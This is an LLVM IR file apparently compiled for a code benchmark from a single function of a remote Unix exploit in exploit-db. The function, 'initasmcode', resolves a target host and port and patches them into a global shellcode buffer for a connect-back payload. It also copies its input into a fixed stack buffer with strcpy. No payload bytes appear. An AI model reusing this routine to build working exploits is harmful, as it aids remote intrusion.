; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22313.c_initasmcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22313.c_initasmcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i8* }

@.str = private unnamed_addr constant [16 x i8] c"error: address\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@AOFF = common dso_local global i64 0, align 8
@AMSK = common dso_local global i64 0, align 8
@POFF = common dso_local global i64 0, align 8
@PMSK = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @initasmcode(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4 x i8], align 1
  %6 = alloca [4 x i8], align 1
  %7 = alloca [2 x i8], align 1
  %8 = alloca [2 x i8], align 1
  %9 = alloca [256 x i8], align 16
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %12 = load i8*, i8** %3, align 8
  %13 = icmp ne i8* %12, null
  br i1 %13, label %17, label %14

14:                                               ; preds = %2
  %15 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %16 = call i32 @gethostname(i8* %15, i32 256)
  br label %21

17:                                               ; preds = %2
  %18 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %19 = load i8*, i8** %3, align 8
  %20 = call i32 @strcpy(i8* %18, i8* %19)
  br label %21

21:                                               ; preds = %17, %14
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %23 = call i32 @inet_addr(i8* %22)
  store i32 %23, i32* %11, align 4
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %37

25:                                               ; preds = %21
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %27 = call %struct.hostent* @gethostbyname(i8* %26)
  store %struct.hostent* %27, %struct.hostent** %10, align 8
  %28 = icmp eq %struct.hostent* %27, null
  br i1 %28, label %29, label %32

29:                                               ; preds = %25
  %30 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  %31 = call i32 @exit(i32 -1) #3
  unreachable

32:                                               ; preds = %25
  %33 = load %struct.hostent*, %struct.hostent** %10, align 8
  %34 = getelementptr inbounds %struct.hostent, %struct.hostent* %33, i32 0, i32 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @memcpy(i32* %11, i8* %35, i32 4)
  br label %37

37:                                               ; preds = %32, %21
  %38 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 0
  %39 = load i32, i32* %11, align 4
  %40 = call i32 @rev(i32 %39)
  %41 = call i32 @putaddr(i8* %38, i32 %40)
  %42 = load i32, i32* %4, align 4
  %43 = ashr i32 %42, 8
  %44 = and i32 %43, 255
  %45 = trunc i32 %44 to i8
  %46 = getelementptr inbounds [2 x i8], [2 x i8]* %7, i64 0, i64 0
  store i8 %45, i8* %46, align 1
  %47 = load i32, i32* %4, align 4
  %48 = and i32 %47, 255
  %49 = trunc i32 %48 to i8
  %50 = getelementptr inbounds [2 x i8], [2 x i8]* %7, i64 0, i64 1
  store i8 %49, i8* %50, align 1
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 0
  %52 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %53 = call i32 @findvalmask(i8* %51, i8* %52, i32 4)
  %54 = getelementptr inbounds [2 x i8], [2 x i8]* %7, i64 0, i64 0
  %55 = getelementptr inbounds [2 x i8], [2 x i8]* %8, i64 0, i64 0
  %56 = call i32 @findvalmask(i8* %54, i8* %55, i32 2)
  %57 = load i32*, i32** @shellcode, align 8
  %58 = load i64, i64* @AOFF, align 8
  %59 = getelementptr inbounds i32, i32* %57, i64 %58
  %60 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 0
  %61 = call i32 @memcpy(i32* %59, i8* %60, i32 4)
  %62 = load i32*, i32** @shellcode, align 8
  %63 = load i64, i64* @AMSK, align 8
  %64 = getelementptr inbounds i32, i32* %62, i64 %63
  %65 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %66 = call i32 @memcpy(i32* %64, i8* %65, i32 4)
  %67 = load i32*, i32** @shellcode, align 8
  %68 = load i64, i64* @POFF, align 8
  %69 = getelementptr inbounds i32, i32* %67, i64 %68
  %70 = getelementptr inbounds [2 x i8], [2 x i8]* %7, i64 0, i64 0
  %71 = call i32 @memcpy(i32* %69, i8* %70, i32 2)
  %72 = load i32*, i32** @shellcode, align 8
  %73 = load i64, i64* @PMSK, align 8
  %74 = getelementptr inbounds i32, i32* %72, i64 %73
  %75 = getelementptr inbounds [2 x i8], [2 x i8]* %8, i64 0, i64 0
  %76 = call i32 @memcpy(i32* %74, i8* %75, i32 2)
  ret void
}

declare dso_local i32 @gethostname(i8*, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i32*, i8*, i32) #1

declare dso_local i32 @putaddr(i8*, i32) #1

declare dso_local i32 @rev(i32) #1

declare dso_local i32 @findvalmask(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
